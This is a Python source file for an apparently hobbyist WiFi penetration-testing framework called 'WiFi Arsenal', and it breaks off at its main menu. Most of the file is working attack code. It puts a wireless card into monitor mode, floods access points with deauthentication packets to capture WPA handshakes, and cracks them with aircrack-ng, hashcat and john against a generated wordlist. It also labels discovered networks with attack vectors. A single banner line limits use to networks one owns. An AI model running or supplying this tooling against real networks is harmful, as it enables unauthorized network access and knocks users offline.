#!/usr/bin/env python3
"""
WiFi Arsenal - Comprehensive WiFi Penetration Testing Framework
Developed by 0x0806
"""

import subprocess
import sys
import os
import time
import re
import threading
import json
import hashlib
import random
import string
import signal
import socket
import struct
import binascii
import tempfile
import shutil
from datetime import datetime
from pathlib import Path
from threading import Thread, Event
from queue import Queue, Empty
import logging

try:
    from scapy.all import *
    from scapy.layers.dot11 import *
    import psutil
    import requests
    from colorama import init, Fore, Back, Style
    import netaddr
    init()
except ImportError as e:
    print(f"[!] Missing required module: {e}")
    print("[*] Installing dependencies...")
    try:
        subprocess.run([sys.executable, '-m', 'pip', 'install', 'scapy', 'psutil', 'requests', 'colorama', 'netaddr'], 
                      check=True)
        from scapy.all import *
        from scapy.layers.dot11 import *
        import psutil
        import requests
        from colorama import init, Fore, Back, Style
        import netaddr
        init()
        print("[+] Dependencies installed successfully")
    except Exception as install_error:
        print(f"[!] Failed to install dependencies: {install_error}")
        print(f"[*] Please install manually: pip3 install scapy psutil requests colorama netaddr")
        # Fallback color definitions
        class Fore:
            RED = '\033[31m'
            GREEN = '\033[32m'
            YELLOW = '\033[33m'
            BLUE = '\033[34m'
            MAGENTA = '\033[35m'
            CYAN = '\033[36m'
            WHITE = '\033[37m'
        class Back:
            BLACK = '\033[40m'
        class Style:
            RESET_ALL = '\033[0m'

class WiFiScanner:
    """Advanced WiFi network scanner"""
    
    def __init__(self, interface):
        self.interface = interface
        self.networks = {}
        self.clients = {}
        
    def scan_with_airodump(self, duration=30):
        """Scan using airodump-ng"""
        if not self.command_exists('airodump-ng'):
            return []
            
        temp_file = f"/tmp/scan_{int(time.time())}"
        cmd = ['airodump-ng', self.interface, '--write', temp_file, '--output-format', 'csv']
        
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(duration)
            process.terminate()
            process.wait(timeout=5)
            
            csv_file = f"{temp_file}-01.csv"
            if os.path.exists(csv_file):
                networks = self.parse_airodump_csv(csv_file)
                for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                    try:
                        os.remove(f"{temp_file}{ext}")
                    except:
                        pass
                return networks
        except Exception as e:
            print(f"{Fore.RED}[!] airodump-ng scan failed: {e}{Style.RESET_ALL}")
        return []

    def scan_with_scapy(self, duration=30):
        """Scan using Scapy"""
        networks = {}
        
        def packet_handler(packet):
            if packet.haslayer(Dot11Beacon):
                bssid = packet[Dot11].addr3
                if not bssid:
                    return
                
                # Extract SSID
                ssid = ""
                try:
                    if packet.haslayer(Dot11Elt):
                        ssid_element = packet[Dot11Elt]
                        if ssid_element.ID == 0:
                            ssid = ssid_element.info.decode('utf-8', errors='ignore')
                except:
                    ssid = "<Hidden>"
                
                # Extract channel
                channel = "1"
                if packet.haslayer(Dot11Elt):
                    current = packet[Dot11Elt]
                    while current and hasattr(current, 'ID'):
                        if current.ID == 3 and hasattr(current, 'info') and len(current.info) >= 1:
                            try:
                                channel = str(current.info[0])
                            except:
                                channel = "1"
                            break
                        current = current.payload if hasattr(current, 'payload') and current.payload else None
                
                # Determine security
                privacy = "Open"
                beacon = packet[Dot11Beacon]
                try:
                    if hasattr(beacon, 'cap') and beacon.cap & 0x10:
                        privacy = "WEP"
                except:
                    pass
                
                # Check for WPA/WPA2
                if packet.haslayer(Dot11Elt):
                    current = packet[Dot11Elt]
                    while current and hasattr(current, 'ID'):
                        try:
                            if current.ID == 48:  # RSN Information Element
                                privacy = "WPA2"
                            elif current.ID == 221 and hasattr(current, 'info') and len(current.info) >= 4:
                                if current.info[:4] == b'\x00\x50\xf2\x01':
                                    privacy = "WPA"
                        except:
                            pass
                        current = current.payload if hasattr(current, 'payload') and current.payload else None
                
                # Signal strength
                power = "-50"
                try:
                    if packet.haslayer(RadioTap):
                        radiotap = packet[RadioTap]
                        if hasattr(radiotap, 'dBm_AntSignal'):
                            power = str(radiotap.dBm_AntSignal)
                        elif hasattr(radiotap, 'antenna_signal'):
                            power = str(radiotap.antenna_signal)
                except:
                    pass
                
                networks[bssid] = {
                    'bssid': bssid,
                    'essid': ssid if ssid else '<Hidden>',
                    'channel': channel,
                    'privacy': privacy,
                    'power': power,
                    'beacons': '1',
                    'first_seen': datetime.now().isoformat(),
                    'last_seen': datetime.now().isoformat()
                }
        
        try:
            sniff(iface=self.interface, prn=packet_handler, timeout=duration, store=False)
        except Exception as e:
            print(f"{Fore.RED}[!] Scapy scanning failed: {e}{Style.RESET_ALL}")
        
        return list(networks.values())

    def command_exists(self, command):
        """Check if command exists"""
        try:
            subprocess.run(['which', command], stdout=subprocess.DEVNULL, 
                          stderr=subprocess.DEVNULL, timeout=5)
            return True
        except:
            return False

class HandshakeCapturer:
    """WPA/WPA2 handshake capture implementation"""
    
    def __init__(self, interface):
        self.interface = interface
        self.handshake_found = False
        
    def capture_handshake(self, target_bssid, target_channel, essid="Unknown", timeout=300):
        """Capture WPA handshake"""
        print(f"{Fore.YELLOW}[*] Starting handshake capture for {essid} ({target_bssid}){Style.RESET_ALL}")
        
        self.set_channel(target_channel)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_essid = re.sub(r'[^\w\-_]', '_', essid)
        capture_file = f"handshake_{safe_essid}_{timestamp}.cap"
        
        if self.command_exists('airodump-ng'):
            return self.capture_with_airodump(target_bssid, target_channel, capture_file, timeout)
        else:
            return self.capture_with_scapy(target_bssid, target_channel, capture_file, timeout)
    
    def capture_with_airodump(self, bssid, channel, output_file, timeout):
        """Capture using airodump-ng"""
        cmd = [
            'airodump-ng', self.interface,
            '--bssid', bssid,
            '--channel', channel,
            '--write', output_file.replace('.cap', '')
        ]
        
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(3)
            
            deauth_thread = Thread(target=self.send_deauth_packets, args=(bssid,))
            deauth_thread.daemon = True
            deauth_thread.start()
            
            start_time = time.time()
            while time.time() - start_time < timeout:
                time.sleep(10)
                if self.verify_handshake(f"{output_file.replace('.cap', '')}-01.cap"):
                    print(f"{Fore.GREEN}[+] Handshake captured successfully!{Style.RESET_ALL}")
                    self.handshake_found = True
                    break
            
            process.terminate()
            process.wait(timeout=5)
            
            if self.handshake_found:
                return f"{output_file.replace('.cap', '')}-01.cap"
            
        except Exception as e:
            print(f"{Fore.RED}[!] Airodump capture failed: {e}{Style.RESET_ALL}")
        
        return None
    
    def send_deauth_packets(self, target_bssid):
        """Send deauthentication packets"""
        if self.command_exists('aireplay-ng'):
            for i in range(10):
                try:
                    subprocess.run([
                        'aireplay-ng', '--deauth', '5',
                        '-a', target_bssid,
                        self.interface
                    ], timeout=15, capture_output=True)
                    time.sleep(2)
                except:
                    time.sleep(2)
        else:
            self.send_deauth_scapy(target_bssid)
    
    def send_deauth_scapy(self, target_bssid):
        """Send deauth packets using Scapy"""
        try:
            broadcast = "ff:ff:ff:ff:ff:ff"
            for i in range(20):
                deauth1 = RadioTap() / Dot11(addr1=broadcast, addr2=target_bssid, addr3=target_bssid) / Dot11Deauth(reason=7)
                deauth2 = RadioTap() / Dot11(addr1=target_bssid, addr2=broadcast, addr3=target_bssid) / Dot11Deauth(reason=7)
                sendp([deauth1, deauth2], iface=self.interface, verbose=False)
                time.sleep(0.1)
        except Exception as e:
            print(f"{Fore.YELLOW}[*] Scapy deauth failed: {e}{Style.RESET_ALL}")
    
    def verify_handshake(self, cap_file):
        """Verify if handshake was captured"""
        if not os.path.exists(cap_file):
            return False
        
        if self.command_exists('aircrack-ng'):
            try:
                result = subprocess.run(['aircrack-ng', cap_file], 
                                      capture_output=True, text=True, timeout=30)
                return "1 handshake" in result.stdout.lower()
            except:
                pass
        
        try:
            return os.path.getsize(cap_file) > 1024
        except:
            return False
    
    def set_channel(self, channel):
        """Set WiFi channel"""
        try:
            subprocess.run(['iwconfig', self.interface, 'channel', str(channel)], 
                          timeout=10, capture_output=True)
        except:
            pass
    
    def command_exists(self, command):
        """Check if command exists"""
        try:
            subprocess.run(['which', command], stdout=subprocess.DEVNULL, 
                          stderr=subprocess.DEVNULL, timeout=5)
            return True
        except:
            return False

class PasswordCracker:
    """Password cracking implementation"""
    
    def __init__(self):
        self.wordlists_dir = "wordlists"
        os.makedirs(self.wordlists_dir, exist_ok=True)
    
    def crack_handshake(self, cap_file, wordlist_file=None, use_gpu=False):
        """Crack WPA handshake"""
        if not os.path.exists(cap_file):
            print(f"{Fore.RED}[!] Capture file not found: {cap_file}{Style.RESET_ALL}")
            return None
        
        if not wordlist_file:
            wordlist_file = self.generate_smart_wordlist()
        
        password = self.crack_with_aircrack(cap_file, wordlist_file)
        if password:
            return password
        
        if use_gpu and self.command_exists('hashcat'):
            password = self.crack_with_hashcat(cap_file, wordlist_file)
            if password:
                return password
        
        if self.command_exists('john'):
            password = self.crack_with_john(cap_file, wordlist_file)
            if password:
                return password
        
        return None
    
    def crack_with_aircrack(self, cap_file, wordlist_file):
        """Crack using aircrack-ng"""
        if not self.command_exists('aircrack-ng'):
            return None
        
        print(f"{Fore.YELLOW}[*] Cracking with aircrack-ng...{Style.RESET_ALL}")
        
        try:
            result = subprocess.run([
                'aircrack-ng', cap_file,
                '-w', wordlist_file
            ], capture_output=True, text=True, timeout=600)
            
            if "KEY FOUND!" in result.stdout:
                for line in result.stdout.split('\n'):
                    if "KEY FOUND!" in line:
                        password = line.split('[')[1].split(']')[0]
                        print(f"{Fore.GREEN}[+] Password found with aircrack-ng: {password}{Style.RESET_ALL}")
                        return password
        except Exception as e:
            print(f"{Fore.RED}[!] aircrack-ng failed: {e}{Style.RESET_ALL}")
        
        return None
    
    def crack_with_hashcat(self, cap_file, wordlist_file):
        """Crack using hashcat"""
        if not self.command_exists('hashcat'):
            return None
        
        print(f"{Fore.YELLOW}[*] Converting to hashcat format...{Style.RESET_ALL}")
        
        hccapx_file = cap_file.replace('.cap', '.hccapx')
        
        try:
            subprocess.run(['cap2hccapx', cap_file, hccapx_file], 
                          timeout=60, capture_output=True)
            
            if os.path.exists(hccapx_file):
                print(f"{Fore.YELLOW}[*] Cracking with hashcat...{Style.RESET_ALL}")
                
                result = subprocess.run([
                    'hashcat', '-m', '2500', hccapx_file, wordlist_file,
                    '--force', '--potfile-disable'
                ], capture_output=True, text=True, timeout=1800)
                
                if 'Cracked' in result.stdout:
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if ':' in line and len(line.split(':')) >= 2:
                            password = line.split(':')[-1].strip()
                            if password:
                                print(f"{Fore.GREEN}[+] Password found with hashcat: {password}{Style.RESET_ALL}")
                                return password
        except Exception as e:
            print(f"{Fore.RED}[!] hashcat failed: {e}{Style.RESET_ALL}")
        
        return None
    
    def generate_smart_wordlist(self, size=50000):
        """Generate comprehensive wordlist"""
        wordlist_file = os.path.join(self.wordlists_dir, 'smart_wordlist.txt')
        print(f"{Fore.YELLOW}[*] Generating smart wordlist ({size} passwords)...{Style.RESET_ALL}")
        
        passwords = set()
        
        # Common passwords
        common_passwords = [
            'password', 'password123', '12345678', '123456789', '12345',
            'qwerty', 'abc123', 'admin', 'letmein', 'welcome', 'monkey',
            'dragon', 'master', 'internet', 'wifi', 'router', 'home',
            'office', 'guest', 'public', 'private', 'secret', 'love',
            'money', 'freedom', 'computer', 'samsung', 'iloveyou'
        ]
        
        passwords.update(common_passwords)
        
        # Generate variations
        base_words = ['password', 'admin', 'wifi', 'internet', 'router', 'home']
        
        for base in base_words:
            for i in range(2000, 2025):
                passwords.add(f"{base}{i}")
            for i in range(100):
                passwords.add(f"{base}{i:02d}")
                passwords.add(f"{base}{i:03d}")
            
            for symbol in ['!', '@', '#', '$', '%', '&', '*']:
                passwords.add(f"{base}{symbol}")
                passwords.add(f"{symbol}{base}")
        
        # Phone number patterns
        area_codes = ['123', '555', '800', '888', '877', '866']
        for area in area_codes:
            for i in range(1000):
                passwords.add(f"{area}{i:04d}")
        
        # Date patterns
        for year in range(1950, 2025):
            for month in range(1, 13):
                for day in range(1, 32):
                    passwords.add(f"{month:02d}{day:02d}{year}")
                    passwords.add(f"{day:02d}{month:02d}{year}")
        
        # Dictionary words with numbers
        dictionary_words = [
            'apple', 'banana', 'cherry', 'dog', 'elephant', 'flower',
            'guitar', 'house', 'island', 'jungle', 'kitchen', 'laptop',
            'mountain', 'nature', 'ocean', 'piano', 'queen', 'rainbow',
            'sunset', 'tiger', 'umbrella', 'violet', 'window', 'yellow'
        ]
        
        for word in dictionary_words:
            passwords.add(word)
            passwords.add(word.capitalize())
            passwords.add(word.upper())
            for i in range(100):
                passwords.add(f"{word}{i}")
                passwords.add(f"{word.capitalize()}{i}")
        
        password_list = list(passwords)[:size]
        
        with open(wordlist_file, 'w') as f:
            for password in password_list:
                f.write(password + '\n')
        
        print(f"{Fore.GREEN}[+] Generated {len(password_list)} passwords to {wordlist_file}{Style.RESET_ALL}")
        return wordlist_file
    
    def command_exists(self, command):
        """Check if command exists"""
        try:
            subprocess.run(['which', command], stdout=subprocess.DEVNULL, 
                          stderr=subprocess.DEVNULL, timeout=5)
            return True
        except:
            return False

class WiFiArsenal:
    """Main WiFi penetration testing class"""
    
    def __init__(self):
        self.version = "3.0.0"
        self.author = "0x0806"
        self.interface = None
        self.monitor_interface = None
        self.target_networks = []
        self.captured_handshakes = []
        self.results_dir = "wifi_arsenal_results"
        self.setup_directories()
        self.setup_logging()

    def setup_directories(self):
        """Create necessary directories"""
        directories = [
            self.results_dir,
            f"{self.results_dir}/handshakes",
            f"{self.results_dir}/wordlists", 
            f"{self.results_dir}/logs",
            f"{self.results_dir}/reports",
            f"{self.results_dir}/scans",
            f"{self.results_dir}/attacks"
        ]
        for directory in directories:
            os.makedirs(directory, exist_ok=True)

    def setup_logging(self):
        """Setup logging"""
        log_file = f"{self.results_dir}/logs/wifi_arsenal.log"
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)

    def banner(self):
        """Display banner"""
        banner = f"""
{Fore.RED}
██╗    ██╗██╗███████╗██╗     ██████╗ ██████╗ ███████╗███████╗███╗   ██╗ █████╗ ██╗     
██║    ██║██║██╔════╝██║    ██╔═══██╗██╔══██╗██╔════╝██╔════╝████╗  ██║██╔══██╗██║     
██║ █╗ ██║██║█████╗  ██║    ███████║██████╔╝███████╗█████╗  ██╔██╗ ██║███████║██║     
██║███╗██║██║██╔══╝  ██║    ██╔══██║██╔══██╗╚════██║██╔══╝  ██║╚██╗██║██╔══██║██║     
╚███╔███╔╝██║██║     ██║    ██║  ██║██║  ██║███████║███████╗██║ ╚████║██║  ██║███████╗
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝
{Style.RESET_ALL}

{Fore.YELLOW}╔══════════════════════════════════════════════════════════════════════════════════╗
║                     WiFi Penetration Testing Suite v{self.version}                    ║
║                                                                                        
║                                                   
╚══════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.GREEN}   🔥 FULL FEATURES:
    📡  Monitor Mode & Interface Control
    🎯 Authentic Network Discovery & Analysis  
    💀 Production-Grade Handshake Capture
    🔓 Multi-Tool Password Cracking
    🌐 Advanced Attack Implementations
    📊 Comprehensive Security Assessment{Style.RESET_ALL}

{Fore.RED}    ⚠️  PRODUCTION SECURITY TOOL - USE RESPONSIBLY
    ⚠️  Only test networks you own or have explicit permission!{Style.RESET_ALL}
"""
        print(banner)

    def check_dependencies(self):
        """Check system dependencies"""
        print(f"{Fore.CYAN}[*] Checking system dependencies...{Style.RESET_ALL}")
        
        critical_tools = {
            'iwconfig': 'Wireless interface configuration',
            'iwlist': 'Wireless network scanning',
            'ip': 'Network interface management'
        }
        
        optional_tools = {
            'aircrack-ng': 'WPA/WPA2 password cracking',
            'airodump-ng': 'WiFi packet capture',
            'aireplay-ng': 'WiFi packet injection',
            'airmon-ng': 'Monitor mode management',
            'hashcat': 'GPU-accelerated password cracking',
            'john': 'Password cracking with rules',
            'reaver': 'WPS attack tool',
            'wash': 'WPS network discovery'
        }
        
        missing_critical = []
        missing_optional = []
        
        for tool, description in critical_tools.items():
            if self.command_exists(tool):
                print(f"{Fore.GREEN}  ✓ {tool:<15} - {description}{Style.RESET_ALL}")
            else:
                missing_critical.append(tool)
                print(f"{Fore.RED}  ✗ {tool:<15} - {description} (MISSING){Style.RESET_ALL}")
        
        for tool, description in optional_tools.items():
            if self.command_exists(tool):
                print(f"{Fore.GREEN}  ✓ {tool:<15} - {description}{Style.RESET_ALL}")
            else:
                missing_optional.append(tool)
                print(f"{Fore.YELLOW}  - {tool:<15} - {description} (optional){Style.RESET_ALL}")
        
        if missing_critical:
            print(f"\n{Fore.RED}[!] Critical tools missing. Install with:")
            print(f"    sudo apt install wireless-tools net-tools{Style.RESET_ALL}")
            return False
        
        if missing_optional:
            print(f"\n{Fore.YELLOW}[*] Optional tools missing. Install for full functionality:")
            print(f"    sudo apt install aircrack-ng hashcat john reaver{Style.RESET_ALL}")
        
        return True

    def command_exists(self, command):
        """Check if command exists"""
        try:
            subprocess.run(['which', command], stdout=subprocess.DEVNULL, 
                          stderr=subprocess.DEVNULL, timeout=5)
            return True
        except:
            return False

    def get_wireless_interfaces(self):
        """Get wireless interfaces"""
        interfaces = []
        
        # Method 1: /proc/net/wireless
        try:
            if os.path.exists('/proc/net/wireless'):
                with open('/proc/net/wireless', 'r') as f:
                    for line in f.readlines()[2:]:
                        if line.strip():
                            interface = line.split(':')[0].strip()
                            if interface:
                                interfaces.append(interface)
        except:
            pass
        
        # Method 2: iwconfig
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True, timeout=10)
            for line in result.stdout.split('\n'):
                if 'IEEE 802.11' in line or 'ESSID:' in line:
                    interface = line.split()[0]
                    if interface and interface not in interfaces:
                        interfaces.append(interface)
        except:
            pass
        
        # Method 3: /sys/class/net/
        try:
            for iface in os.listdir('/sys/class/net/'):
                wireless_path = f'/sys/class/net/{iface}/wireless'
                if os.path.exists(wireless_path) and iface not in interfaces:
                    interfaces.append(iface)
        except:
            pass
        
        return interfaces

    def setup_monitor_mode(self, interface):
        """Setup monitor mode"""
        print(f"{Fore.YELLOW}[*] Setting up monitor mode on {interface}{Style.RESET_ALL}")
        self.logger.info(f"Setting up monitor mode on {interface}")
        
        # Method 1: airmon-ng
        if self.command_exists('airmon-ng'):
            try:
                subprocess.run(['airmon-ng', 'check', 'kill'], 
                              timeout=30, capture_output=True)
                
                result = subprocess.run(['airmon-ng', 'start', interface], 
                                       capture_output=True, text=True, timeout=30)
                
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'monitor mode enabled' in line.lower():
                            patterns = [
                                r'\[phy\d+\](\w+)',
                                r'on (\w+)',
                                r'(\w+mon)',
                                r'wlan\d+mon'
                            ]
                            
                            for pattern in patterns:
                                match = re.search(pattern, line)
                                if match:
                                    self.monitor_interface = match.group(1) if match.groups() else match.group(0)
                                    print(f"{Fore.GREEN}[+] Monitor mode enabled: {self.monitor_interface}{Style.RESET_ALL}")
                                    return True
                    
                    # Try common monitor interface names
                    monitor_candidates = [f"{interface}mon", "wlan0mon", "wlan1mon"]
                    for candidate in monitor_candidates:
                        try:
                            result = subprocess.run(['iwconfig', candidate], 
                                                  capture_output=True, text=True, timeout=5)
                            if 'Mode:Monitor' in result.stdout:
                                self.monitor_interface = candidate
                                print(f"{Fore.GREEN}[+] Monitor mode enabled: {self.monitor_interface}{Style.RESET_ALL}")
                                return True
                        except:
                            continue
                            
            except Exception as e:
                print(f"{Fore.YELLOW}[*] airmon-ng failed: {e}{Style.RESET_ALL}")
        
        # Method 2: Manual setup
        try:
            print(f"[*] Attempting enhanced manual monitor mode setup...")
            
            # Check if interface exists
            result = subprocess.run(['ip', 'link', 'show', interface], 
                                  capture_output=True, timeout=5)
            if result.returncode != 0:
                print(f"{Fore.RED}[!] Interface {interface} not found{Style.RESET_ALL}")
                return False
            
            # Kill potential interfering processes
            try:
                interfering_processes = ['wpa_supplicant', 'dhcpcd', 'NetworkManager', 'wpa_cli']
                for process in interfering_processes:
                    subprocess.run(['pkill', '-f', process], capture_output=True, timeout=5)
                time.sleep(2)
            except:
                pass
            
            # Bring interface down with retry
            for attempt in range(3):
                try:
                    result = subprocess.run(['ip', 'link', 'set', interface, 'down'], 
                                          capture_output=True, timeout=10)
                    if result.returncode == 0:
                        break
                    time.sleep(2)
                except subprocess.TimeoutExpired:
                    if attempt == 2:
                        break
            
            # Set monitor mode with retry using multiple methods
            monitor_commands = [
                ['iw', 'dev', interface, 'set', 'type', 'monitor'],
                ['iwconfig', interface, 'mode', 'monitor']
            ]
            
            success = False
            for cmd in monitor_commands:
                for attempt in range(3):
                    try:
                        result = subprocess.run(cmd, capture_output=True, timeout=10)
                        if result.returncode == 0:
                            success = True
                            break
                        time.sleep(1)
                    except subprocess.TimeoutExpired:
                        if attempt == 2:
                            print(f"{Fore.YELLOW}[*] Command {' '.join(cmd)} timed out{Style.RESET_ALL}")
                    except FileNotFoundError:
                        print(f"{Fore.YELLOW}[*] Command {cmd[0]} not found{Style.RESET_ALL}")
                        break
                if success:
                    break
            
            # Bring interface up with retry
            for attempt in range(3):
                try:
                    result = subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                                          capture_output=True, timeout=10)
                    if result.returncode == 0:
                        break
                    time.sleep(2)
                except subprocess.TimeoutExpired:
                    if attempt == 2:
                        try:
                            subprocess.run(['ifconfig', interface, 'up'], capture_output=True, timeout=10)
                        except:
                            pass
            
            # Verify monitor mode with multiple methods
            verification_commands = [
                ['iwconfig', interface],
                ['iw', 'dev', interface, 'info']
            ]
            
            for cmd in verification_commands:
                try:
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                    if ('Mode:Monitor' in result.stdout or 'type monitor' in result.stdout):
                        self.monitor_interface = interface
                        print(f"{Fore.GREEN}[+] Manual monitor mode enabled: {self.monitor_interface}{Style.RESET_ALL}")
                        return True
                except:
                    continue
        
        except Exception as e:
            print(f"{Fore.RED}[!] Manual setup failed: {e}{Style.RESET_ALL}")
        
        # Method 3: Alternative approach using rfkill
        try:
            print(f"[*] Attempting rfkill unblock...")
            subprocess.run(['rfkill', 'unblock', 'wifi'], capture_output=True, timeout=10)
            subprocess.run(['rfkill', 'unblock', 'all'], capture_output=True, timeout=10)
            time.sleep(2)
            
            # Try again with basic setup
            for cmd_set in [
                [['ifconfig', interface, 'down'], ['iwconfig', interface, 'mode', 'monitor'], ['ifconfig', interface, 'up']],
                [['ip', 'link', 'set', interface, 'down'], ['iw', 'dev', interface, 'set', 'type', 'monitor'], ['ip', 'link', 'set', interface, 'up']]
            ]:
                try:
                    for cmd in cmd_set:
                        subprocess.run(cmd, capture_output=True, timeout=10)
                    
                    # Verify
                    result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=10)
                    if 'Mode:Monitor' in result.stdout:
                        self.monitor_interface = interface
                        print(f"{Fore.GREEN}[+] Monitor mode enabled with rfkill: {self.monitor_interface}{Style.RESET_ALL}")
                        return True
                except:
                    continue
        except Exception as e:
            print(f"{Fore.YELLOW}[*] rfkill method failed: {e}{Style.RESET_ALL}")
        
        # Method 4: Fallback - use interface in managed mode for basic scanning
        print(f"{Fore.YELLOW}[*] Monitor mode failed, attempting limited managed mode operation...{Style.RESET_ALL}")
        try:
            up_commands = [
                ['ifconfig', interface, 'up'],
                ['ip', 'link', 'set', interface, 'up']
            ]
            
            for cmd in up_commands:
                try:
                    subprocess.run(cmd, capture_output=True, timeout=10)
                    result = subprocess.run(['ip', 'link', 'show', interface], 
                                          capture_output=True, text=True, timeout=5)
                    if 'state UP' in result.stdout or 'UP' in result.stdout:
                        self.monitor_interface = interface
                        print(f"{Fore.YELLOW}[+] Using interface in managed mode (limited functionality): {self.monitor_interface}{Style.RESET_ALL}")
                        return True
                except:
                    continue
        except:
            pass
        
        print(f"{Fore.RED}[!] All monitor mode setup methods failed{Style.RESET_ALL}")
        return False

    def stop_monitor_mode(self):
        """Stop monitor mode"""
        if self.monitor_interface:
            print(f"{Fore.YELLOW}[*] Stopping monitor mode...{Style.RESET_ALL}")
            
            if self.command_exists('airmon-ng'):
                try:
                    subprocess.run(['airmon-ng', 'stop', self.monitor_interface], 
                                  timeout=30, capture_output=True)
                except:
                    pass
            
            # Manual cleanup
            try:
                subprocess.run(['ip', 'link', 'set', self.monitor_interface, 'down'], timeout=10)
                subprocess.run(['iw', 'dev', self.monitor_interface, 'set', 'type', 'managed'], timeout=10)
                subprocess.run(['ip', 'link', 'set', self.monitor_interface, 'up'], timeout=10)
            except:
                pass
            
            self.monitor_interface = None

    def scan_networks(self, duration=60):
        """Scan for WiFi networks"""
        if not self.monitor_interface:
            print(f"{Fore.RED}[!] Monitor mode not enabled{Style.RESET_ALL}")
            return []
        
        print(f"{Fore.CYAN}[*] Starting advanced network scan ({duration}s)...{Style.RESET_ALL}")
        
        scanner = WiFiScanner(self.monitor_interface)
        
        # Try multiple scanning methods
        networks = []
        
        if self.command_exists('airodump-ng'):
            networks = scanner.scan_with_airodump(duration)
        
        if not networks:
            networks = scanner.scan_with_scapy(duration)
        
        # Enhance with security analysis
        for network in networks:
            network['security_analysis'] = self.analyze_security(network)
            network['attack_vectors'] = self.identify_attack_vectors(network)
        
        return networks

    def analyze_security(self, network):
        """Analyze network security"""
        analysis = {
            'encryption': network.get('privacy', 'Unknown'),
            'vulnerabilities': [],
            'strength': 'Unknown',
            'risk_level': 'Low'
        }
        
        privacy = network.get('privacy', '').upper()
        
        if 'WEP' in privacy:
            analysis['vulnerabilities'] = ['WEP Cracking', 'IV Attack', 'Fragmentation Attack']
            analysis['strength'] = 'Very Weak'
            analysis['risk_level'] = 'Critical'
        elif 'WPA3' in privacy:
            analysis['vulnerabilities'] = ['Dragonfly Downgrade']
            analysis['strength'] = 'Strong'
            analysis['risk_level'] = 'Low'
        elif 'WPA2' in privacy:
            analysis['vulnerabilities'] = ['Handshake Capture', 'PMKID Attack', 'Dictionary Attack']
            analysis['strength'] = 'Medium'
            analysis['risk_level'] = 'Medium'
        elif 'WPA' in privacy:
            analysis['vulnerabilities'] = ['WPA Dictionary Attack', 'Handshake Capture']
            analysis['strength'] = 'Weak'
            analysis['risk_level'] = 'High'
        elif privacy in ['OPEN', '', 'NONE']:
            analysis['vulnerabilities'] = ['Open Network', 'Man-in-the-Middle', 'Evil Twin']
            analysis['strength'] = 'None'
            analysis['risk_level'] = 'Critical'
        
        return analysis

    def identify_attack_vectors(self, network):
        """Identify attack vectors"""
        vectors = []
        privacy = network.get('privacy', '').upper()
        
        try:
            power = int(network.get('power', '-100'))
        except:
            power = -100
        
        if power > -50:
            vectors.append('Close Range Attacks')
        
        if 'WEP' in privacy:
            vectors.extend(['WEP Cracking', 'Fake Authentication', 'Fragmentation Attack'])
        if 'WPA' in privacy:
            vectors.extend(['Handshake Capture', 'PMKID Attack', 'Dictionary Attack'])
        if privacy in ['OPEN', '', 'NONE']:
            vectors.extend(['Evil Twin', 'DNS Spoofing', 'Packet Injection'])
        
        vectors.extend(['Deauthentication Attack', 'Beacon Flood', 'Reconnaissance'])
        
        return vectors

    def display_networks(self, networks):
        """Display discovered networks"""
        if not networks:
            print(f"{Fore.RED}[-] No networks found{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════════╗")
        print(f"║                           DISCOVERED NETWORKS                                    ║")
        print(f"╚══════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        print(f"{'#':<3} {'ESSID':<20} {'BSSID':<18} {'Ch':<3} {'Pwr':<4} {'Security':<10} {'Risk':<8} {'Vectors':<8}")
        print("-" * 90)
        
        for i, network in enumerate(networks):
            try:
                essid = network.get('essid', '<Unknown>')
                bssid = network.get('bssid', 'Unknown')
                channel = network.get('channel', '?')
                power = network.get('power', '?')
                privacy = network.get('privacy', 'Unknown')
                
                if essid in ['', ' ', 'Hidden', '<Hidden>', None]:
                    essid_display = f"{Fore.YELLOW}<Hidden>{Style.RESET_ALL}"
                else:
                    if len(essid) > 18:
                        essid_display = essid[:15] + "..."
                    else:
                        essid_display = essid
                
                analysis = network.get('security_analysis', {})
                risk = analysis.get('risk_level', 'Unknown')
                vectors = len(network.get('attack_vectors', []))
                
                if risk == 'Critical':
                    risk_color = Fore.RED
                elif risk == 'High':
                    risk_color = Fore.YELLOW
                elif risk == 'Medium':
                    risk_color = Fore.CYAN
                else:
                    risk_color = Fore.GREEN
                
                print(f"{i+1:<3} {essid_display:<20} {bssid:<18} "
                      f"{str(channel):<3} {str(power):<4} "
                      f"{privacy:<10} {risk_color}{risk:<8}{Style.RESET_ALL} {vectors:<8}")
                      
            except Exception as e:
                print(f"{i+1:<3} {'<Error>':<20} {'Unknown':<18} {'?':<3} {'?':<4} {'Unknown':<10} {'Unknown':<8} {'0':<8}")
                continue

    def main_menu(self):
        """Main menu"""
        while True:
            print(f"\n{Fore.CYAN}" + "="*80)
            print("                         WiFi Arsenal - Main Menu")
            print("="*80 + Style.RESET_ALL)
            
            print(f"{Fore.GREEN}🔧 Setup & Configuration:{Style.RESET_ALL}")
            print("1.  Interface Setup & Monitor Mode")
            print("2.  System Dependency Check")
            
            print(f"\n{Fore.YELLOW}📡 Network Operations:{Style.RESET_ALL}")
            print("3.  Advanced Network Discovery")
            print("4.  Handshake Capture")
            print("5.  Password Cracking")
            
            print(f"\n{Fore.RED}⚔️  Attack Modules:{Style.RESET_ALL}")
            print("6.  WPS Attack Suite")
